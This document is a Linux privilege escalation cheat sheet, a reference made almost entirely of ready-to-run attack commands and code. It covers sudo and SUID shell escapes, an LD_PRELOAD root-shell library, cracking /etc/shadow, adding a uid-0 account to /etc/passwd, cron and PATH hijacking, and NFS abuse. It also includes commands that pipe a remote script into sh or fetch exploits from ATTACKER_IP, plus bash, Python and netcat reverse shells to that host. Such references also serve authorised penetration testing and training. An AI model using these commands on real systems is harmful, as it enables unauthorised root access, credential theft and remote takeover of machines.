# Linux Privilege Escalation Reference

## System Enumeration

```bash
# Basic system info
hostname && uname -a && cat /proc/version
cat /etc/issue && cat /etc/*-release && arch

# Current user context
whoami && id && groups
cat /etc/passwd | grep -v nologin | grep -v false

# Network info
ip addr && ip route
ss -tulpn && netstat -antup

# Running processes (look for root services)
ps aux | grep root
ps axjf

# Environment (check PATH for hijacking)
env && echo $PATH
```

## Automated Enumeration

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Transfer to target
python3 -m http.server 8000   # attacker
wget http://ATTACKER_IP:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

## Kernel Exploits

### Identify Kernel Version
```bash
uname -r && cat /proc/version
searchsploit linux kernel [version]
```

### Common Kernel Exploits

| Kernel Version | Exploit | CVE |
|---------------|---------|-----|
| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

```bash
wget http://ATTACKER_IP/exploit.c
gcc exploit.c -o exploit && ./exploit
```

**Limitations:** Modern kernels have ASLR, SMEP, SMAP. AppArmor/SELinux may block. Container environments limit kernel exploits.

## Sudo Exploitation

### Enumerate Sudo Privileges
```bash
sudo -l
```

### GTFOBins Sudo Exploitation
Reference: https://gtfobins.github.io

```bash
sudo vim -c ':!/bin/bash'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import os; os.system("/bin/bash")'
sudo less /etc/passwd   # then type: !bash
sudo env /bin/bash
sudo perl -e 'exec "/bin/bash";'
sudo man man            # then type: !bash
```

### LD_PRELOAD Exploitation
When `env_keep` includes `LD_PRELOAD`:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

## SUID Binary Exploitation

### Find SUID Binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Exploit SUID Binaries
```bash
# base64 for file reading
LFILE=/etc/shadow
base64 "$LFILE" | base64 -d

# find with SUID
find . -exec /bin/sh -p \; -quit

# cp for SUID bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p
```

### Password Cracking via SUID
```bash
base64 /etc/shadow | base64 -d > shadow.txt
base64 /etc/passwd | base64 -d > passwd.txt
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Add User to passwd (if writable or SUID editor)
```bash
openssl passwd -1 -salt new newpassword
# Add to /etc/passwd:
# newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

## Capabilities Exploitation

```bash
# Enumerate capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Vim with cap_setuid
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# Perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa && tar -xvf key.tar
```

## Cron Job Exploitation

### Enumerate Cron Jobs
```bash
cat /etc/crontab
ls -la /var/spool/cron/crontabs/
ls -la /etc/cron.*
systemctl list-timers
```

### Exploit Writable Cron Scripts
```bash
# Identify writable script from /etc/crontab
ls -la /opt/backup.sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/backup.sh
# Wait for execution, then:
/tmp/bash -p

# If cron references non-existent script in writable PATH
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
chmod +x /home/user/antivirus.sh
```

## PATH Hijacking

```bash
# Find SUID binary calling external command
strings /usr/local/bin/suid-binary
# Shows: system("service apache2 start")

# Hijack by creating malicious binary in writable PATH
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
/usr/local/bin/suid-binary
```

## NFS Exploitation

```bash
# On target: look for no_root_squash option
cat /etc/exports

# On attacker: mount share and create SUID binary
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/nfs
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell

# On target: execute
/share/shell
```

## MySQL Running as Root

```bash
mysql -u root -p
\! chmod +s /bin/bash
exit
/bin/bash -p
```

## Quick Reference

| Purpose | Command |
|---------|---------|
| Kernel version | `uname -a` |
| Current user | `id` |
| Sudo rights | `sudo -l` |
| SUID files | `find / -perm -u=s -type f 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab` |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| NFS exports | `cat /etc/exports` |

## Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444
```

## Key Resources
- GTFOBins: https://gtfobins.github.io
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Exploit compilation fails | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static` |
| Reverse shell not connecting | Check firewall; try ports 443/80; check egress filtering |
| SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux |
| Cron job not executing | Verify cron running: `service cron status`; check +x permissions |
| sudo -l requires password | Try SUID, cron, capabilities, NFS instead |
